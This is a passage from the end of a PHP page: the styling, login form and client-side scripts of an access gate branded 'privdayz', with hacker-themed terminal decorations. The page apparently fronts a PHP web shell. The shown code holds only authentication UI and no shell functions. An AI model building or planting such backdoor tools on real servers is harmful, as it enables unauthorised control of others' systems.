                gap: 8px;
                color: #888;
                font-size: 13px;
                cursor: pointer;
            }

            .prv-remember input[type="checkbox"] {
                appearance: none;
                width: 18px;
                height: 18px;
                background: #1a1d24;
                border: 1.5px solid #2a2d34;
                border-radius: 5px;
                cursor: pointer;
                position: relative;
                transition: all 0.3s;
            }

            .prv-remember input[type="checkbox"]:checked {
                background: #e53935;
                border-color: #e53935;
            }

            .prv-remember input[type="checkbox"]:checked::before {
                content: '\f00c';
                font-family: 'Font Awesome 6 Free';
                font-weight: 900;
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                color: #fff;
                font-size: 10px;
            }

            .prv-forgot {
                color: #e53935;
                font-size: 13px;
                text-decoration: none;
                transition: color 0.3s;
            }

            .prv-forgot:hover {
                color: #ff6b6b;
                text-decoration: underline;
            }

            .prv-login-btn {
                width: 100%;
                background: #e53935;
                border: none;
                border-radius: 12px;
                padding: 16px;
                color: #fff;
                font-size: 16px;
                font-weight: 600;
                text-transform: uppercase;
                letter-spacing: 2px;
                cursor: pointer;
                transition: all 0.3s;
                position: relative;
                overflow: hidden;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }

            .prv-login-btn:hover {
                background: #c62828;
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(229, 57, 53, 0.4);
            }

            .prv-login-btn:active {
                transform: translateY(0);
            }

            .prv-login-btn i {
                font-size: 18px;
                transition: transform 0.3s;
            }

            .prv-login-btn:hover i {
                transform: translateX(5px);
            }

            .prv-login-btn.loading {
                pointer-events: none;
                opacity: 0.7;
            }

            .prv-login-btn.loading i {
                animation: spin 1s linear infinite;
            }

            @keyframes spin {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
            }

            .prv-footer {
                margin-top: 24px;
                text-align: center;
                color: #444;
                font-size: 12px;
            }

            .prv-footer a {
                color: #e53935;
                text-decoration: none;
                transition: color 0.3s;
            }

            .prv-footer a:hover {
                color: #ff6b6b;
                text-decoration: underline;
            }

            .prv-footer i {
                margin: 0 4px;
                font-size: 10px;
            }

            .prv-status-led {
                display: inline-block;
                width: 8px;
                height: 8px;
                background: #e53935;
                border-radius: 50%;
                margin-right: 6px;
                animation: blink 1.5s infinite;
            }

            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.3; }
            }

            .prv-terminal-lines {
                position: absolute;
                bottom: 20px;
                left: 20px;
                color: #e53935;
                font-size: 10px;
                opacity: 0.3;
                font-family: monospace;
                line-height: 1.4;
            }

            .prv-terminal-lines div {
                animation: fadeIn 0.5s ease forwards;
                opacity: 0;
            }

            .prv-terminal-lines div:nth-child(1) { animation-delay: 0.1s; }
            .prv-terminal-lines div:nth-child(2) { animation-delay: 0.3s; }
            .prv-terminal-lines div:nth-child(3) { animation-delay: 0.5s; }

            @keyframes fadeIn {
                to { opacity: 1; }
            }

            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
                20%, 40%, 60%, 80% { transform: translateX(5px); }
            }

            .shake {
                animation: shake 0.5s ease;
            }
        </style>
    </head>
    <body>
        <div class="prv-terminal-lines">
            <div># root@pr1vdayz ~ $</div>
            <div># establishing secure connection...</div>
            <div># authentication required</div>
        </div>

        <div class="prv-login-container">
            <div class="prv-login-card">
                <div class="prv-header">
                    <div class="prv-logo">
                        <i class="fas fa-terminal"></i>
                        <span>pr!v/<b>v1</b></span>
                    </div>
                    <div class="prv-version">
                        <i class="fas fa-shield-alt"></i> secured shell v2025 <i class="fas fa-shield-alt"></i>
                    </div>
                </div>

                <?php if ($login_error): ?>
                <div class="prv-alert" id="alertMessage">
                    <i class="fas fa-exclamation-triangle"></i>
                    <span><?php echo htmlspecialchars($login_error); ?></span>
                </div>
                <script>
                    setTimeout(() => {
                        const alert = document.getElementById('alertMessage');
                        if (alert) {
                            alert.style.opacity = '0';
                            alert.style.transform = 'translateY(-10px)';
                            alert.style.transition = 'all 0.3s ease';
                            setTimeout(() => alert.remove(), 300);
                        }
                    }, 5000);
                </script>
                <?php endif; ?>

                <form method="POST" action="" id="loginForm">
                    <div class="prv-form-group">
                        <label><i class="fas fa-user-secret"></i> USERNAME</label>
                        <div class="prv-input-wrapper">
                            <i class="fas fa-user"></i>
                            <input type="text" name="username" id="username" placeholder="enter username" 
                                   value="<?php echo isset($_COOKIE['pr1vdayz_remember']) ? htmlspecialchars(ADMIN_USERNAME) : ''; ?>" 
                                   autocomplete="off" autofocus required>
                        </div>
                    </div>

                    <div class="prv-form-group">
                        <label><i class="fas fa-key"></i> PASSWORD</label>
                        <div class="prv-input-wrapper">
                            <i class="fas fa-lock"></i>
                            <input type="password" name="password" id="password" placeholder="••••••••" required>
                            <i class="fas fa-eye prv-password-toggle" id="togglePassword"></i>
                        </div>
                    </div>

                    <div class="prv-options">
                        <label class="prv-remember">
                            <input type="checkbox" name="remember" id="remember" 
                                   <?php echo isset($_COOKIE['pr1vdayz_remember']) ? 'checked' : ''; ?>>
                            <span>remember session</span>
                        </label>
                        <a href="#" class="prv-forgot" onclick="showResetMessage(); return false;">
                            <i class="fas fa-question-circle"></i> reset?
                        </a>
                    </div>

                    <button type="submit" name="login_submit" class="prv-login-btn" id="loginBtn">
                        <span>authenticate</span>
                        <i class="fas fa-arrow-right"></i>
                    </button>
                </form>

                <div class="prv-footer">
                    <span class="prv-status-led"></span>
                    <span>protected by </span>
                    <a href="https://privdayz.com" target="_blank">privdayz.com</a>
                    <i class="fas fa-bolt"></i>
                    <a href="https://t.me/privdayz" target="_blank">t.me/privdayz</a>
                </div>
            </div>
        </div>

        <script>
            // Toggle password visibility
            const togglePassword = document.getElementById('togglePassword');
            const passwordInput = document.getElementById('password');

            togglePassword.addEventListener('click', function() {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                this.classList.toggle('fa-eye');
                this.classList.toggle('fa-eye-slash');
            });

            // Show reset password message
            function showResetMessage() {
                const alertContainer = document.querySelector('.prv-alert');
                if (alertContainer) {
                    alertContainer.remove();
                }
                
                const newAlert = document.createElement('div');
                newAlert.className = 'prv-alert';
                newAlert.innerHTML = `
                    <i class="fas fa-info-circle"></i>
                    <span>Contact administrator: admin@privdayz.com</span>
                `;
                
                const header = document.querySelector('.prv-header');
                header.insertAdjacentElement('afterend', newAlert);
                
                setTimeout(() => {
                    newAlert.style.opacity = '0';
                    newAlert.style.transform = 'translateY(-10px)';
                    newAlert.style.transition = 'all 0.3s ease';
                    setTimeout(() => newAlert.remove(), 300);
                }, 5000);
            }

            // Handle form submission
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                const loginBtn = document.getElementById('loginBtn');
                loginBtn.classList.add('loading');
                loginBtn.innerHTML = '<span>authenticating</span><i class="fas fa-spinner"></i>';
            });

            // Auto-focus username field
            window.onload = () => {
                document.getElementById('username').focus();
            };

            // Prevent context menu on login card
            document.querySelector('.prv-login-card').addEventListener('contextmenu', (e) => {
                e.preventDefault();
                return false;
            });

            // Add input event listeners to remove error class
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('input', () => {
                    document.querySelector('.prv-login-card').classList.remove('shake');
                });
            });

            <?php if ($login_error): ?>
            document.querySelector('.prv-login-card').classList.add('shake');
            <?php endif; ?>
        </script>
    </body>
    </html>
    
<?php endif; ?>